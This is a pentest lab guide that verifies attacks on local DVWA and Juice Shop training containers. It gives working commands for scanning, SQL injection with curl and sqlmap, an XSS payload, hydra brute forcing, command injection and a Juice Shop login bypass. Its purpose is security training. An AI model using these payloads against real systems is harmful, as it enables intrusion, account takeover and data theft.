# Pentest Lab Attack Verification Tests

This guide provides step-by-step tests to verify that attacks from the attacker terminal actually affect the DVWA and Juice Shop websites.

## üéØ Prerequisites

1. **Start the lab** through the CyberPro portal or with `docker-compose up -d`
2. **Open three browser tabs:**
   - Tab 1: Attacker Terminal ‚Üí http://localhost:7681
   - Tab 2: DVWA Target ‚Üí http://localhost:8081
   - Tab 3: Juice Shop Target ‚Üí http://localhost:3001

## Test 1: Network Discovery & Connectivity ‚úÖ

### In Attacker Terminal:
```bash
# Check your IP
ip a | grep "inet 172"
# Expected: 172.25.0.10

# Discover targets
discover.sh

# Ping DVWA
ping -c 3 172.25.0.50
# Expected: 3 packets transmitted, 3 received

# Ping Juice Shop
ping -c 3 172.25.0.60
# Expected: 3 packets transmitted, 3 received
```

### Verification:
‚úÖ Both targets respond to ping  
‚úÖ No packet loss

---

## Test 2: Port Scanning (Affects: None, but verifies targets are up)

### In Attacker Terminal:
```bash
# Quick scan of DVWA
nmap -sV 172.25.0.50

# Quick scan of Juice Shop
nmap -sV 172.25.0.60
```

### Expected Results:
- **DVWA:** Port 80/tcp open (Apache/PHP)
- **Juice Shop:** Port 3000/tcp open (Node.js)

### In DVWA/Juice Shop Tabs:
‚úÖ Websites remain accessible  
‚úÖ No visible changes (port scanning is passive)

---

## Test 3: Web Vulnerability Scanning (Affects: Server logs)

### In Attacker Terminal:
```bash
# Scan DVWA for vulnerabilities
nikto -h http://172.25.0.50 -Tuning 1 -maxtime 60s
```

### In DVWA Tab:
1. Navigate to http://localhost:8081
2. The site should still be accessible
3. **Effect:** Server logs will show scan requests (not visible in UI)

### Verification:
‚úÖ DVWA remains functional during scan  
‚úÖ Nikto reports vulnerabilities found

---

## Test 4: Directory Enumeration (Affects: Server logs)

### In Attacker Terminal:
```bash
# Find hidden directories on DVWA
dirb http://172.25.0.50 -r -z 10

# Or use gobuster (faster)
gobuster dir -u http://172.25.0.50 -w /usr/share/wordlists/dirb/common.txt -t 20 -q
```

### In DVWA Tab:
1. Try accessing discovered directories manually
2. Example: http://localhost:8081/config/
3. Example: http://localhost:8081/docs/

### Verification:
‚úÖ Discovered directories are accessible  
‚úÖ You can browse to them in the DVWA tab

---

## Test 5: SQL Injection (Affects: Database & Visible Output) üéØ

This is the **most visible** attack - you'll see real-time effects!

### Setup in DVWA Tab:
1. Go to http://localhost:8081
2. Login: `admin` / `password`
3. Click **DVWA Security** ‚Üí Set to **Low**
4. Navigate to **SQL Injection** page
5. Note the current page URL and get your session cookie:
   - Press F12 ‚Üí Application ‚Üí Cookies ‚Üí PHPSESSID value

### In Attacker Terminal:
```bash
# Basic SQL injection test
curl "http://172.25.0.50/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit" \
  -H "Cookie: security=low; PHPSESSID=YOUR_SESSION_ID_HERE"

# Use sqlmap to extract database names
sqlmap -u "http://172.25.0.50/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=YOUR_SESSION_ID_HERE" \
  --batch --dbs
```

### In DVWA Tab (SQL Injection page):
1. Manually test: Enter `1' OR '1'='1` in the User ID field
2. Click Submit
3. **Expected Effect:** See ALL users instead of just one!

### Verification:
‚úÖ SQLMap successfully extracts database names  
‚úÖ Manual injection shows all users  
‚úÖ Attack bypasses authentication logic

---

## Test 6: Cross-Site Scripting (XSS) (Affects: Visible Output) üéØ

### Setup in DVWA Tab:
1. Navigate to **XSS (Reflected)** page
2. Keep this tab visible

### In Attacker Terminal:
```bash
# Test XSS payload
curl "http://172.25.0.50/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>" \
  -H "Cookie: security=low; PHPSESSID=YOUR_SESSION_ID_HERE"
```

### In DVWA Tab (XSS Reflected page):
1. Enter this in the name field: `<script>alert('Hacked!')</script>`
2. Click Submit
3. **Expected Effect:** Alert popup appears!

### Verification:
‚úÖ XSS payload executes  
‚úÖ Alert box appears in browser  
‚úÖ Script injection successful

---

## Test 7: Brute Force Attack (Affects: Login attempts) üéØ

### In Attacker Terminal:
```bash
# Create a small password list
echo -e "password\nadmin\n123456\nletmein\nwelcome" > /tmp/passwords.txt

# Brute force DVWA login
hydra -l admin -P /tmp/passwords.txt 172.25.0.50 http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=YOUR_SESSION_ID_HERE"
```

### In DVWA Tab:
1. Navigate to **Brute Force** page
2. Watch for login attempts (if you refresh during the attack)

### Verification:
‚úÖ Hydra finds the correct password  
‚úÖ Multiple login attempts visible in logs

---

## Test 8: Command Injection (Affects: Server execution) üéØ

### Setup in DVWA Tab:
1. Navigate to **Command Injection** page
2. Keep this tab visible

### In Attacker Terminal:
```bash
# Test command injection
curl "http://172.25.0.50/vulnerabilities/exec/" \
  --data "ip=127.0.0.1;whoami&Submit=Submit" \
  -H "Cookie: security=low; PHPSESSID=YOUR_SESSION_ID_HERE"
```

### In DVWA Tab (Command Injection page):
1. Enter: `127.0.0.1; whoami`
2. Click Submit
3. **Expected Effect:** See ping output AND the username!

### Verification:
‚úÖ Command injection executes  
‚úÖ Additional commands run on server  
‚úÖ Output visible in response

---

## Test 9: Juice Shop - Finding Hidden API (Affects: Discovery)

### In Attacker Terminal:
```bash
# Enumerate Juice Shop directories
gobuster dir -u http://172.25.0.60:3000 \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 20 -q
```

### In Juice Shop Tab:
1. Try accessing discovered endpoints
2. Example: http://localhost:3001/api
3. Example: http://localhost:3001/ftp

### Verification:
‚úÖ Hidden directories discovered  
‚úÖ Can access them in browser  
‚úÖ Find sensitive information

---

## Test 10: Juice Shop - SQL Injection Login Bypass üéØ

### In Attacker Terminal:
```bash
# Test SQL injection on login
curl -X POST http://172.25.0.60:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"anything"}'
```

### In Juice Shop Tab:
1. Go to login page
2. Email: `admin@juice-sh.op' OR 1=1--`
3. Password: `anything`
4. Click Login
5. **Expected Effect:** Login successful without valid password!

### Verification:
‚úÖ SQL injection bypasses authentication  
‚úÖ Logged in as admin  
‚úÖ Challenge completed notification appears

---

## üéØ Summary of Visible Effects

| Attack Type | Visible in Browser? | Real-time Effect? |
|-------------|-------------------|-------------------|
| Port Scan | ‚ùå No | Passive reconnaissance |
| Nikto Scan | ‚ùå No | Server logs only |
| Directory Enum | ‚úÖ Yes | Can browse discovered paths |
| **SQL Injection** | ‚úÖ‚úÖ‚úÖ **YES** | **Shows all data** |
| **XSS** | ‚úÖ‚úÖ‚úÖ **YES** | **Alert popup** |
| **Command Injection** | ‚úÖ‚úÖ‚úÖ **YES** | **Executes commands** |
| Brute Force | ‚ö†Ô∏è Partial | Login attempts |
| **Juice Shop SQLi** | ‚úÖ‚úÖ‚úÖ **YES** | **Bypass login** |

## üî• Best Tests for Real-Time Visualization

For the **most dramatic** real-time effects, do these in order:

1. **Test 5 (SQL Injection)** - See all users appear
2. **Test 6 (XSS)** - See alert popup
3. **Test 8 (Command Injection)** - See command output
4. **Test 10 (Juice Shop SQLi)** - Bypass login

These attacks show **immediate, visible changes** in the target website tabs!

## üìù Quick Verification Checklist

Run this quick test to verify everything works:

```bash
# In Attacker Terminal
ping -c 2 172.25.0.50 && \
nmap -p 80 172.25.0.50 && \
curl -s http://172.25.0.50 | grep -i "dvwa" && \
echo "‚úÖ DVWA is reachable and responding!"

ping -c 2 172.25.0.60 && \
nmap -p 3000 172.25.0.60 && \
curl -s http://172.25.0.60:3000 | grep -i "juice" && \
echo "‚úÖ Juice Shop is reachable and responding!"
```

If both show ‚úÖ, your lab is working correctly!
